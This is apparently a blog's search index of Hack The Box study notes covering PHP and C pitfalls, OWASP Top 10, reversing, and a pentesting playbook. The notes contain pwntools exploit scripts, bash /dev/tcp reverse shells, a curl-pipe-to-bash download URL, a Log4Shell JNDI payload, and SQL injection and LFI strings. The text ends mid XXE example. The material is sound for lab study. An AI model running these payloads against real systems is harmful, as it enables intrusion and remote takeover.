[
  
  {
    "title"    : "Security and programming language",
    "category" : "",
    "tags"     : " linux, hacking, hack-the-box, pentesting, c, php",
    "url"      : "/security-and-languages/",
    "date"     : "January 24, 2023",
    "excerpt"  : "I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the knowledge I’ve got regarding pentesting and certain programming languages.\n\n\n\nThis article describe some features of programming languag...",
  "content"  : "I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the knowledge I’ve got regarding pentesting and certain programming languages.\n\n\n\nThis article describe some features of programming languages that if used wrong, they can be attack vectors for applications. It’s not that the language is unsecure, but the features can be misused very easily.\n\nProgramming languages\n\n  PHP\n  C\n\n\nPHP \n\nType juggling\n\nDue to the nature of PHP we can abuse the type jungling feature.\n\nThe following condition will be true and print the message.\n$example_int = 7\n$example_str = “7”\nif ($example_int == $example_str) {\n   echo(&quot;PHP can compare ints and strings.&quot;)\n}\n\n\nSo, an if with == will not check the types. Only === check the types. Internally php select statement uses == comparisson, therefore is vulnerable to this kind of vulnerability. See https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09\n\nSo, if you spot a switch statement that checks a user provided string, just change the string value to true.\n\nstrcmp\n\nYou can also check if the page is using php to abuse the strcmp function.\n\nif(strcmp($PASSWORD, $_GET[&#39;password&#39;]) == 0){\n        $success = true;\n}\n\n\nThanks to the type juggling describe above, if strcmp returns NULL the condition will be true. We can force this by passing the password field as an array:\n\nhttp://yrmyzscnvh.abctf.xyz/web6/?password[]=%22%22\n\n\nExample: https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016\n\nC \n\nunion\n\nA union type in C lang is a special type that allows the developer to reuse a memory position to store multiple types of data.\n\n#include &amp;lt;stdio.h&amp;gt;\n#include &amp;lt;string.h&amp;gt;\n \nunion Data {\n   int i;\n   float f;\n   char str[20];\n};\n \nint main( ) {\n\n   union Data data;        \n\n   data.i = 10;\n   data.f = 220.5;\n   strcpy( data.str, &quot;C Programming&quot;);\n\n   printf( &quot;data.i : %d\\n&quot;, data.i);\n   printf( &quot;data.f : %f\\n&quot;, data.f);\n   printf( &quot;data.str : %s\\n&quot;, data.str);\n\n   return 0;\n}\n\n\nOutputs:\n\ndata.i : 1917853763\ndata.f : 4122360580327794860452759994368.000000\ndata.str : C Programming\n\n\nIf the developer rely on this union to hide a secret and let the user access to it, the user can change the value of the union by writing a different type that will be converted to the proper type when checking the secret.\n\nExample:\n\nstatic union {\n    unsigned long long integer;\n    char string[8];\n} DataStore;\n\nvoid get_flag() {\n    if (DataStore.integer == 13371337) {\n        system(&quot;cat flag.txt&quot;);\n        exit(0);\n    } else {\n        puts(&quot;\\nSorry, this will not work!&quot;);\n    }\n}\nvoid set_field(field_t f) {\n    char buf[32] = {0};\n    printf(&quot;\\nMaybe try a ritual?\\n\\n&amp;gt;&amp;gt; &quot;);\n    fgets(buf, sizeof(buf), stdin);\n    switch (f) {\n    case INTEGER:\n        sscanf(buf, &quot;%llu&quot;, &amp;amp;DataStore.integer);\n        if (DataStore.integer == 13371337) {\n            puts(&quot;\\nWhat&#39;s this nonsense?!&quot;);\n            exit(-1);\n        }\n        break;\n    case STRING:\n        memcpy(DataStore.string, buf, sizeof(DataStore.string));\n        break;\n    }\n}\n\n\nIt turns out, the user can write to both fields in the union. However, if we set the magic number to get the secret, the app will exit. However, we can set in the string the byte value of the integer field:\n\nr.sendline(p64(13371337))\n\nIn the example we use python pwntools library to generate the byte value (in 64 bytes) of the magic number.\n"
} ,
  
  {
    "title"    : "OWASP Top 10",
    "category" : "",
    "tags"     : " linux, hacking, hack-the-box, pentesting, owasp",
    "url"      : "/owasp-top10/",
    "date"     : "January 9, 2023",
    "excerpt"  : "I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the knowledge I’ve got related with OWASP Top 10 vulnerabilities.\n\n\n\nOWASP Top 10\n\nIn OWASP Top 10 website, you can see what are the most co...",
  "content"  : "I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the knowledge I’ve got related with OWASP Top 10 vulnerabilities.\n\n\n\nOWASP Top 10\n\nIn OWASP Top 10 website, you can see what are the most common vulnerabilities to exploit.\n\nThey are well categorized and they provide examples in website.\n\nI’ll try to explain the groups sorted by order of occurrence in this article. This should be like a map to follow when pentesting things.\n\nBroken Access Control\n\nhttps://owasp.org/Top10/A01_2021-Broken_Access_Control/\n\nMalicious users can manipulate access control mechanisms.\n\nExamples of this are:\n\n\n  Modify the loging cookie to change from regular user to admin user\n  Manipulate JWT Tokens\n  …\n\n\nCryptographic Failures\n\nhttps://owasp.org/Top10/A02_2021-Cryptographic_Failures/\n\nExamples of this are:\n\n\n  Using old ciphers in symmetric encryption\n  Using short keys for RSA key: able to generate the private key from the public key\n  Unsalted passwords\n  …\n\n\nInjection\n\nhttps://owasp.org/Top10/A03_2021-Injection/\n\nWhen the user can input some value to the application, the developers should pay extra attention to validate or sanitize it. Otherwise, a malicious user can inject any value on it.\n\nExamples are:\n\n  SQL injections: break the SQL query syntax to execute arbitrary queries\n  OS injections: being able to execute os commands via the user input\n  Server-side template injection: abuse a template engine to inject any code\n  …\n\n\nThe injection can be reflected on the screen: the typical use case is for login. You log in with made up username and you see the username back in the UI. This helps a lot because you can test with attack attempts.\n\nIf you don’t see the results back, you can try 2 things:\n\n  Write to a public file: if the target has a public endpoint, you can make the injection to write to a file in that public directory to extract the data.\n  Out of band interaction: if you own a server, you can make the target connect to that server to exfiltrate the data\n  Abuse of the errors: if you see the stacktrace, you can use it in your favour and throw errors containg the information you want to extract.\n\n\nInsecure Design\n\nhttps://owasp.org/Top10/A04_2021-Insecure_Design/\n\nExamples of this are:\n\n\n  Bot detection mechanism\n  Credentials hardcoded in the code\n  …\n\n\nSecurity Misconfiguration\n\nhttps://owasp.org/Top10/A05_2021-Security_Misconfiguration/\n\nThis topic is very broad and might include things like:\n\n\n  Default users, passwords\n  Unprotected paths of the application (remember nginx off-by-slash vulnerability)\n  Stack traces revealing information to the user\n\n\nVulnerable and Outdated Components\n\nhttps://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\n\nUsing old libraries might cause the application to be vulnerable to new attacks that recent versions of the library fix\n\nWhen you are exploring this attack vector, check the repository of the library (if open source) and look for commits for the next versions. If you see something looking like a security fix, it’s worth trying to replicate it in your setup.\n\nIdentification and Authentication Failures\n\nhttps://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\n\nExamples:\n\n\n  Default/weak password\n  Allowing brute force attacks to guess username/password\n\n\nSoftware and Data Integrity Failures\n\nhttps://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\n\nApplication that relies on plugins, libraries, etc.. from third-party must verify the integrity of the component. This also applies to the user input. If the user can see and modified a serialized payload, that payload should be handled with extra care. Additionally, CI/CD pipeline must be well secured, otherwise the attackers might modified the shipped software.\n\nSecurity Logging and Monitoring Failures\n\nhttps://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\n\nNot enough monitoring for thins like an excessive number of failed login attemps, etc…\n\nServer-Side Request Forgery (SSRF)\n\nhttps://owasp.org/Top10/A102021-Server-Side_Request_Forgery%28SSRF%29/\n\nThis happens when an application fetches a resource from a third-pary from the input provided by a user. For instance, in a template engine, the legitimate users might include an image stored in their webserver. However, an attack might include their own crafted version of the image that includes malicious code.\n"
} ,
  
  {
    "title"    : "Reversing playbook",
    "category" : "",
    "tags"     : " linux, hacking, hack-the-box, reverse-engineering",
    "url"      : "/reversing-playbook/",
    "date"     : "January 4, 2023",
    "excerpt"  : "I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the steps I take to complete the challenges related with reversing.\n\n\n\nTable of contents\n\n  Introduction\n  Buffer overflow\n  Obfuscated code...",
  "content"  : "I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the steps I take to complete the challenges related with reversing.\n\n\n\nTable of contents\n\n  Introduction\n  Buffer overflow\n  Obfuscated code\n  String format vulnerability\n  Security flags\n  ASLR\n  one gadget\n  Overwrite Global Object Table\n\n\nIntroduction \n\nThere are a series of challenges where you are given a binary file and you need to be able to obtain the flag inside. In order to do so, you need to perform Reverse engineering. In order to do so, you should use a debugger or a decompiler (or both).\n\nThe first step is to use regularly and pay attention to the strings appearing in the UI. Later, we can search those strings in the decompiler.\n\nOne useful tool to perform this kind of analysis is ghidra: https://github.com/NationalSecurityAgency/ghidra.\n\nFor instance, you can search for references, memory addresses, search for strings, etc..\n\nAnother interesting tool is gdb, the gnu debugger. More on this to come, when i’m not familiar.\n\nTo debug Windows binaries, you can use ollydbg, analyse the code and place the breakpoints in the interesting addresses.\n\nBuffer overflow \n\nIn order to understand this attack, first we need to understand how the memory works in the computers.\n\nWe first need to understand that memory has the following regions:\n\n\n  \n    \n      Stack\n      stores function local variables and information about function calls: return address, arguments, etc..\n    \n    \n      Heap\n      stores the dynamic memory. Used by malloc, etc…\n    \n    \n      BSS\n      stores the uninitialized static/global variables\n    \n    \n      Data\n      stores the static/global variables\n    \n    \n      Text\n      read only, stores the executable code\n    \n  \n\n\nInside the stack, a new stack frame is created for every function execution. Inside a stack frame, we can see:\n\n\n  \n    \n      Function arguments\n       \n    \n    \n      Return address\n      where to go when the execution ends\n    \n    \n      Previous frame pointer\n      to know what is the stack frame of the function calling this function\n    \n    \n      Local variables\n       \n    \n  \n\n\nTake this functions as example:\n#include &amp;lt;string.h&amp;gt;\nvoid foo(char *str)\n{\n  char buffer[12];\n  /* The following statement will result in buffer overflow */\n  strcpy(buffer, str);\n}\nint main()\n{\n  char *str = &quot;This is definitely longer than 12&quot;;\n  foo(str);\n  return 1;\n}\n\n\nThe stack frame for foo() will look like this:\n\n\n  \n    \n      arguments: str (pointer)\n    \n    \n      Return address\n    \n    \n      Previous Frame Pointer\n    \n    \n      Local variables buffer[11]…buffer[1]\n    \n  \n\n\nIn this case, we can keep adding data into the buffer until we reach the memory address of the return address. \nThen, we can tell the program to jump to any function that we want.\n\nKnowing that, buffer overflow technique consists in three stages:\n\nOverflow the stack pointer\n\nwhen a function does not limit the input characters, it can happen that the user inputs more bytes than the expected, e.g: gets function:\n\nvoid vuln(void)\n\n{\n  char local_bc [180];\n  \n  gets(local_bc);\n  puts(local_bc);\n  return;\n}\n\nIn this case, if the user inputs 200 chars, the program will fail with segmentation fault and the data will be injected in some unknown region of the stack.\n\nReach to the return address\n\nKnowing that the function is vulnerable to buffer overflow, we can craft a special payload that change the return address to make it jump where we want.\n\nIn order to do this, the first thing we need to do is find the offset on the input data in order to write to the return address.\n\nUsing ghidra we can find easily the value of the return function as it will be the next instruction just after the invocation to our target function, so you will need to calculate the payload using those values.\n\nYou can do it in a less manual way using gdb-peda:\n\nKnowing that the buffer has 180 chars, let’s suppose that will 200 chars will overflow it, let’s create a pattern of 200 chars:\n\npattern_create 200 bof.txt\n\nand input it to the program:\n\nr &amp;lt; pattern.txt\n\nWhen the program crashes, we’ll see the registers:\nYou know who are 0xDiablos: \nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\nProgram received signal SIGSEGV, Segmentation fault.\n\n[----------------------------------registers-----------------------------------]\nEAX: 0xc9 \nEBX: 0x76414158 (&#39;XAAv&#39;)\nECX: 0xf7fa09b4 --&amp;gt; 0x0 \nEDX: 0x1 \nESI: 0xffffcf94 --&amp;gt; 0xffffd165 (&quot;/home/gal/workspace/hack-the-box/boxes/you-know-0x-diables/vuln&quot;)\nEDI: 0xf7ffcb80 --&amp;gt; 0x0 \nEBP: 0x41594141 (&#39;AAYA&#39;)\nESP: 0xffffceb0 (&quot;ZAAxAAyA&quot;)\nEIP: 0x41417741 (&#39;AwAA&#39;)\nEFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x41417741\n[------------------------------------stack-------------------------------------]\n0000| 0xffffceb0 (&quot;ZAAxAAyA&quot;)\n0004| 0xffffceb4 (&quot;AAyA&quot;)\n0008| 0xffffceb8 --&amp;gt; 0xf7fbeb00 --&amp;gt; 0xf7d8fcd4 (&quot;GCC_3.0&quot;)\n0012| 0xffffcebc --&amp;gt; 0x3e8 \n0016| 0xffffcec0 --&amp;gt; 0xffffcee0 --&amp;gt; 0x1 \n0020| 0xffffcec4 --&amp;gt; 0xf7f9f000 --&amp;gt; 0x229dac \n0024| 0xffffcec8 --&amp;gt; 0xf7ffd020 --&amp;gt; 0xf7ffda40 --&amp;gt; 0x0 \n0028| 0xffffcecc --&amp;gt; 0xf7d96519 --&amp;gt; 0x8310c483 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x41417741 in ?? ()\n\nThe interesting one is EIP as it is the register that points to the next instruction. Note that if you change the payload, the value of the EIP pointer will change as well.\n\nNow, we can use pattern_offset to obtain exactly the number of characters to reach to Return address:\ngdb-peda$ pattern_offset 0x41417741\n1094809409 found at offset: 188\n\n\nNow we know that if we write exactly 188 chars, the next content will be written to the return address and we can make the program jump to where we want.\n\nWrite the exploit\n\nIn the case I’m working on the exploit just need to call another function in the code. In order to so, I’ll use python pwntools: https://github.com/Gallopsled/pwntools which helps a lot on these kind of things.\n\nfrom pwn import *\n\ncontext.update(arch=&quot;i386&quot;, os=&quot;linux&quot;)\n\nelf = ELF(&quot;./vuln&quot;)\n\n# offset to reach right before return address&#39;s location\noffset = b&quot;A&quot; * 188\n\n# craft exploit: offset + flag() + padding + parameter 1 + parameter 2\nexploit = offset + p32(elf.symbols[&#39;flag&#39;], endian=&quot;little&quot;) + p32(0x90909090) + p32(0xdeadbeef, endian=&quot;little&quot;) + p32(0xc0ded00d, endian=&quot;little&quot;)\n\nr = elf.process()\nr.sendlineafter(&quot;:&quot;, exploit)\nr.interactive()\n\nRemember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters.\n\nObfusctaed code \n\nSometimes, when trying to reverse the code, you might see strings that look very odd, e.g:\n\n3734203635203636203132322036352036382034382036352037342031.\n\nThis might be some string buf obfuscated somehow. So far, I found this kind of simple de-obfuscation (the plan is to keep updating this with more obfuscation techniques):\n\n\n  hex to decimal &amp;gt; decimal to char &amp;gt; decode all string in base64:\n\n\nimport binascii\nimport base64\n\ndef dec_to_chr(str):\n    return &quot;&quot;.join([chr(int(s)) for s in str.decode(&#39;utf-8&#39;).split(&#39; &#39;)])\n\nbase64text = &quot;&quot;\nbase64text = base64text + dec_to_chr(binascii.unhexlify(&quot;3734203635203636203132322036352036382034382036352037342031&quot;) + binascii.unhexlify(&quot;31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033&quot;))\nbase64text = base64text + dec_to_chr(binascii.unhexlify(&quot;3635203631&quot;))\nprint(base64.b64decode(base64text).decode())\n$s=&#39;77.74.\n\nIn this case, this looks like the begining of a script trying to connect to an IP address.\n\nString format vulnerability \n\nSome pieces of unsecure code, will print whatever the user is coding, see:\n\n__isoc99_scanf(&quot;%299s&quot;,local_148);\nprintf(local_148);\n\n\nIf we’re a malicious user, can use that piece of code to leak memory addresses from the stack simply by using string format: %p,%p,%p will leak the first\nthree memory positions in the stack: 0x1,0x1,0x7ffff7d14a37\n\nMore info here: https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/\n\nMore info about the possible formats: https://en.wikipedia.org/wiki/Printf_format_string\n\nSecurity flags \n\nWhen a binary is generated, there are some flags that can be setup for security reasons, here are listed. To check it you can use checksec:\n\ngal@gal-Modern-14-C12M:~/workspace/gal/blog$ checksec /usr/bin/ls\n[*] &#39;/usr/bin/ls&#39;\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n\n\n\n  RELRO: If there’s no RELRO protection, it means that the Global Object Table (GOT) is writtable. The GOT contains the memory address of the standard library methods. If you can override this, it means that when computer executes puts, will execute arbitrary code.\n  Stack: canary found, it means it hard to crash and gain code execution via buffer overflow.\n  NX: No code execution from the stack\n  PIE: executable is loaded at random address.\n\n\nMore info: https://opensource.com/article/21/6/linux-checksec\n\nASLR: Address Space Layout Randomisation\n\nThis is a technique used to avoid memory corruption attacks. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.\n\nIn order to check if a exploit is stable, you can enable this in gdb, to check if your compter offset works in all situations:\ngef➤  aslr on\n[+] Enabling ASLR\ngef➤  start\n\n\nOne gadget\n\nhttps://github.com/david942j/one_gadget\n\nlibc library has some pieces of code that runs a piece of code similar to execve(&#39;/bin/sh&#39;, NULL, NULL) which will lead to remote code execution.\n\nYou can use the one gadget to know exactly the memory address you need to point to achive this RCE.\n\ngal@gal-Modern-14-C12M:~/workspace/hackthebox/spooky-time/challenge$ one_gadget glibc/libc.so.6 \n0x50a37 posix_spawn(rsp+0x1c, &quot;/bin/sh&quot;, 0, rbp, rsp+0x60, environ)\nconstraints:\n  rsp &amp;amp; 0xf == 0\n  rcx == NULL\n  rbp == NULL || (u16)[rbp] == NULL\n\n0xebcf1 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])\nconstraints:\n  address rbp-0x78 is writable\n  [r10] == NULL || r10 == NULL\n  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL\n\n0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx)\nconstraints:\n  address rbp-0x78 is writable\n  [r10] == NULL || r10 == NULL\n  [rdx] == NULL || rdx == NULL\n\n0xebcf8 execve(&quot;/bin/sh&quot;, rsi, rdx)\nconstraints:\n  address rbp-0x78 is writable\n  [rsi] == NULL || rsi == NULL\n  [rdx] == NULL || rdx == NULL\n\n\nFor every memory address, it also describe which value the register need to have in order to execute the RCE.\n\nOverwrite Global Object Table \n\nThe global object table is used to dynamically resolve standard library functions (scanf, printf, etc…). If you can modify it, you can alias an arbitrary code as any standard library function. You can use this flaw plus the one gadge tool in the previous section to setup a Remote Code Execution.\n\nBelow, you can find an example of how we can override the global object table using the one gadget tool:\n\nfrom pwn import *\n\ncontext.binary = elf = ELF(&#39;./spooky_time&#39;)\nlibc = context.binary.libc\n\nr = process(&#39;./spooky_time&#39;)\n\nr.sendlineafter(b&#39;scary!\\n\\n&#39;, &#39;%3$lx%51$lx&#39;)\nr.recvuntil(b&#39;than \\n&#39;)\nlibc.address = int(r.recvn(12), 16) - 1133111\nelf.address = int(r.recvn(12), 16) - 5056\nlibc_one_gadget = libc.address + 0xebcf5 # libc.address + offset computed with one gadget tool\n\nfmtstr_payload = fmtstr_payload(8, {elf.got[&#39;puts&#39;] : libc_one_gadget}) # we make the function puts point to a RCE\n\nr.sendlineafter(b&#39;time..\\n\\n&#39;, fmtstr_payload)\n\nr.interactive()\n\n"
} ,
  
  {
    "title"    : "Pentesting interesting links",
    "category" : "",
    "tags"     : " linux, hacking, hack-the-box, pentesting",
    "url"      : "/pentesting-resources/",
    "date"     : "December 25, 2022",
    "excerpt"  : "I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting interesting links I found.\n\n\n\nResources\n\n\n  \n    \n      Name\n      Description\n      Link\n    \n    \n      pentestbook.six2dez...",
  "content"  : "I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the pentesting interesting links I found.\n\n\n\nResources\n\n\n  \n    \n      Name\n      Description\n      Link\n    \n    \n      pentestbook.six2dez.com\n      General guides on pentesting\n      https://pentestbook.six2dez.com/\n    \n    \n      revshells\n      List of reverse shells\n      https://www.revshells.com/\n    \n    \n      Hacktricks\n      Useful for everything related with pentesting\n      https://book.hacktricks.xyz/welcome/readme\n    \n    \n      SecLists\n      Wordlists and stuff\n      https://github.com/danielmiessler/SecLists\n    \n    \n      Reverse shells\n      More reverse shells payloads\n      swisskyrepo/PayloadsAllTheThings\n    \n    \n      Pentestmonkey\n      Another pentesting guide\n      https://pentestmonkey.net/\n    \n    \n      GTFOBins\n      List of UNIX binaries that can be used to bypass local security restrictions\n      https://gtfobins.github.io/\n    \n    \n      LOLbas\n      Similar to GTFObins but for Windows\n      https://lolbas-project.github.io/\n    \n    \n      Red team notes\n      Red team notes\n      https://www.ired.team/\n    \n    \n      SQL injections\n      SQL injections\n      SQL injection cheatsheet\n    \n    \n      CVE mitre\n      Search for CVEs\n      https://cve.mitre.org/cve/search_cve_list.html\n    \n    \n      Request repo\n      Tool to receive HTTP request and display data\n      https://requestrepo.com/\n    \n    \n      CTF 101\n      CTF theory\n      https://ctf101.org/\n    \n  \n\n"
} ,
  
  {
    "title"    : "Pentesting playbook",
    "category" : "",
    "tags"     : " linux, hacking, hack-the-box, pentesting",
    "url"      : "/pentesting-playbook/",
    "date"     : "December 25, 2022",
    "excerpt"  : "I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the steps I take to complete the challenges.\n\n\n\nWhile performing pentesting, there are a series of steps that are always the same. The steps...",
  "content"  : "I have started playing around in https://www.hackthebox.com platform and I’ll use this article to save all the steps I take to complete the challenges.\n\n\n\nWhile performing pentesting, there are a series of steps that are always the same. The steps are (sorted by order):\n\nTable of contents\n\n  Enumeration\n  Breaking in\n    \n      Poorly configured access\n      Brute force user/password\n      SQL Injection\n      Server-side template injection\n      Arbitrary file upload\n      Local file inclusion\n      Remote file inclusion\n      Reverse shell\n      Rogue servers\n        \n          NTLM\n          Log4JShell\n        \n      \n      Search for vulnerabilities\n      XML eXternal Entities\n      JWT Key Confussion\n      Cross-Site Scripting\n    \n  \n  Foothold, we are in\n    \n      List users/group\n      Search keywords\n      Local port forwarding\n      Lateral movement\n      Search for SSH keys\n    \n  \n  Privilege escalation\n    \n      Privilege escalation on Windows\n      Privilege escalation on Linux\n        \n          Set owner User ID\n          Abuse regular application\n        \n      \n    \n  \n\n\nEnumeration \n\nUsing nmap the attacker needs to see what is open in the target machine. For reference check: pentesting tools.\n\nAt this stage, we’ll behave like a legitimate user, e.g.: perform regular searches, etc…\n\nIf you discover a website, it’s interesting to test the following enumeration techniques:\n\nDirectory brute force\n\nThis is a technique useful to detect available paths for a web application. Also known as dir busting.\n\nThe technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (200 OK) answer to the page. If so, we discover a page in that path.\n\nThe tools to perform this is gobuster.\n\nAnother option is to use sitemap functionality of burp suite\n\nFor reference check: pentesting tools.\n\nSub-domain brute force\n\nThis techniques tries to discover sub-domains configured, you can do it by checking the DNS records or the virtual hosts configured in a server. You can use gobuster to perform this.\n\nBreaking in \n\nThis stage is the most varied one, the idea is to find a vulnerability to get to a shell into the machine. At this point, you should have a list of services (and versions) that are running in the machine. You can do a google query with the service you want to explot.\n\nThe attack vector is different to each machine, here you can find most common vector attacks:\n\nPoorly configured access \n\nThe user might have ftp or tftp or smb shares with anonymous access. It’s worth taking a look because those access might leak some valuable information. Additionally, you can also check metasploit to check for this kind of access.\n\nFor reference check: pentesting tools.\n\nBrute force user password \n\nIf you discover a login page, why not trying some default user/password combinations?. One thing to try is to search for the version of the software and query google for the default user/password.\n\nTry the following user/password combinations first:\n\nadmin:admin\nadministrator:administrator\nadmin:administrator\nadmin:password\nadministrator:password\n\n\nAnother option to try here is to try to brute force the user/password:\n\nYou can try a dictionary attack to bruce force user/password combinations.\n\nYou can use a tool like thc-hydra: https://github.com/vanhauser-thc/thc-hydra. However, this will fail if there if there’s any kind of CSRF protection.\n\nIn order to bypass the CSRF protection, we must do the requests from the browser. I prepared a tool to do that:\n\nhttps://github.com/adriangalera/pydra/\n\nTake into account that if you know for sure the user, it will take much less time than having to guess both user and password.\n\nSQL Injection \n\nPoorly programmed queries can be very dangerous and leads to escaping issues in the queries. If you see any indications of a query, try to use sqlmap to identify potential SQL injections or try some very basic ones.\n\nIf the SQL queries are poorly built, it means that they are susceptible to SQL injections. If the user input is not sanitised, we can break up SQL queries that will cause problems, such as bypassing a login page.\n\nA typical SQL query for a login page can look like this:\n\nSELECT * FROM members WHERE username = &#39;admin&#39; AND password = &#39;admin&#39;\n\n\nIf the input values are not sanitised, we can break the query by putting a comment character to comment the part of query that does the password checking:\n\nSELECT * FROM members WHERE username = &#39;admin&#39; #&#39; AND password = &#39;kjdfjklsdf&#39;\n\n\nNow the query becomes:\n\nSELECT * FROM members WHERE username = &#39;admin&#39;\n\n\ntherefore, the query is no longer checking for password and the login page is bypassed.\n\nusername: admin&#39;#\npassword: admin123 (any password will do the trick)\n\n\nYou can find more SQL injections here: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/\n\nPay attention when breaking the rest of the query with comments. The standard comment -- might not always work, it’s worth trying another kind of comments like #\n\nServer side template injection \n\nif you see a search form and you type something and you see the output of what you typed again in the webpage, the webpage might be susceptible for SSTI. Try to identify which template engine and search how to exploit it.\n\nIf the target is using a templating engine, it is possible to use the template injection to execute commands in the server.\n\nOne easy way to test that is to put something like {{7*7}} in the template and check for the result.\n\nIf the template executes, we’ll see the result, out of luck we will see nothing. Or maybe we’ll see some trace that reveals the technology behind.\n\nArbitrary file upload \n\nThis is a very interesting vulnerability. It lets the attacker upload some file to the server. You can do this to start a reverse shell. That is the targeted machine establish a permanent connection to the attacker machine and it provides a shell where the attacker can run commands if it was inside the machine.\n\nLocal File Include (LFI) \n\nAbuse of file loading capability (for instance PHP include function) to show a local file in the browser:\n\nhttp://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts\n\n\nYou can try to read the following files for Linux:\n/etc/hosts\n/etc/passwd\n\n\nand for Windows:\nC:/Windows/System32/drivers/etc/hosts\nc:/windows/win.ini\n\n\nRemote File Include (RFI) \n\nRemote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts.\n\nThis can be use to force the target make a call to a compromised host in the same network and captura the credentials challenge:\n\nhttp://unika.htb/index.php?page=\\\\10.1.2.3\\blabla\\\n\n\nReverse shell \n\nReverse basically means that it is the target that will initiate a connection request back us (the attacker).\n\nFor example, once we have remote code execution in the target, we’ll be able to download and execute a piece of code.\n\nUsually the process is:\n\n  Create a file in the attacker machine containing a reverse shell payload:\n    #!/bin/bash\nbash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;YOUR_IP_ADDRESS&amp;gt;/1337 0&amp;gt;&amp;amp;1\n    \n  \n  Create a server in the attacker machine which will act as the shell I/O. Normally this is done with netcat.\n    nc -nvlp 1337\n    \n  \n  Start a webserver in the attacker machine that will server the reserve shell payload. You can do that with python (in the same directory as the payload):\n    python3 -m http.server 8000\n    \n  \n  Make the target machine download and execute the reverse shell payload:\n    http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash\n    \n  \n\n\nYou can find a list of reverse shells here: https://www.revshells.com/\n\nOnce you have shell access, you can try to get a improve the shell if python is installed:\n\npython3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\n\nor\nscript /dev/null -c bash\n\nor\npython3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\nCTRL+Z\nstty raw -echo\nfg\nexport TERM=xterm\n\n\nOr, you can find mmore methods to improve the shell here: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/\n\nFor reference check: pentesting tools.\n\nRogue servers \n\nThe idea of rogue server is to start a server in the attacker machine and make the target machine speaks with the attacker server. This is used for instance to retrieve NTLM hash challenge or to explot log4j vulnerability.\n\nNTLM \n\nWindows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.\n\nIn order to mess with it, you might use the responder tool\n\nThe idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by responder tool). This tool will capture the authentication challenge hash and then you can use john tool to compare the hash with a dictionary to see if any entry matches.\n\nFor reference check: pentesting tools.\n\nLog4jShell \n\nIt was discovered that log4j libraries for certain versions were vulnerable to remote code execution. In order to do so, you setup a rogue JNDI/LDAP server from https://github.com/veracode-research/rogue-jndiin the attacker machine and send a JNDI command to the target machine to communicate with the rogue LDAP server to get a revershe shell on the attacker machine.\n\nE.g.:\n\njava -jar target/RogueJndi-1.1.jar --command &quot;bash -c\n{echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,-\nd}|{bash,-i}&quot; --hostname &quot;10.10.14.33&quot;\n\nStart the rogue JNDI server that will start a reverse shell on 10.10.14.33 using the base64 payload provided.\n\nThen, send the payload to force the target machine connect the rogue JNDI/LDAP server:\n\n${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}\n\n\nSearch for vulnerabilities \n\nIf you can establish the version of the service running, you can query for any known vulnerability of that version:\n\nhttps://cve.mitre.org/cve/search_cve_list.html\n\nXML eXternal Entities \n\nIf the application is using XML to process any input data, it might be vulnerable to this kind of attacks.\n\nThis attack works because the XML parser usually are configured with support for XML external entities. This is a feature of XML to be able to define objects outside the defined structure, but can be abuse to list internal files or to make connections to the outside of the target machine.\n\nIn order to check if the machine is vulnerable to this attack, you can try to show the contents of /etc/hosts(Linux) or C:/Windows/System32/drivers/etc/hosts(Windows). e.g.:\n\n&amp;lt;?xml version = &quot;1.0&quot;?&amp;gt;\n&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM 